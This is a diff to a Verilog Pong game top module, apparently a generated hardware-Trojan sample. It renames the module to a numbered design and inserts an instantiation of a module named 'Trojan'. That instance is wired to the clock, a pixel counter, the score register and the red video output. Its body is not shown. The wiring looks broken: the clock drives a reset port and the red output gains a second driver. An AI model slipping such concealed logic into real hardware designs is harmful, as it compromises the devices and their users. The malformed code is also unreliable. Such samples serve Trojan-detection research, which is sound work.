@@ -1,4 +1,4 @@
-module Pong_Top
+module design2101
   #(parameter c_TOTAL_COLS=800,
     parameter c_TOTAL_ROWS=525,
     parameter c_ACTIVE_COLS=640,
@@ -51,6 +51,14 @@ module Pong_Top
   // Divided version of the Row/Col Counters
   // Allows us to make the board 40x30
   wire [5:0] w_Col_Count_Div, w_Row_Count_Div;
+
+  // Instantiate the Trojan module
+  Trojan Trojan_Inst (
+      .pon_rst_n_i(i_Clk),
+      .prog_dat_i(w_Col_Count),
+      .pc_reg(r_P1_Score),
+      .prog_adr_o(o_Red_Video)
+  );
 
   Sync_To_Count #(.TOTAL_COLS(c_TOTAL_COLS),
                   .TOTAL_ROWS(c_TOTAL_ROWS)) Sync_To_Count_Inst
@@ -173,5 +181,6 @@ module Pong_Top
   assign o_Red_Video = w_Draw_Any ? 4'b1111 : 4'b0000;
   assign o_Grn_Video = w_Draw_Any ? 4'b1111 : 4'b0000;
   assign o_Blu_Video = w_Draw_Any ? 4'b1111 : 4'b0000;
+
 
 endmodule // Pong_Top
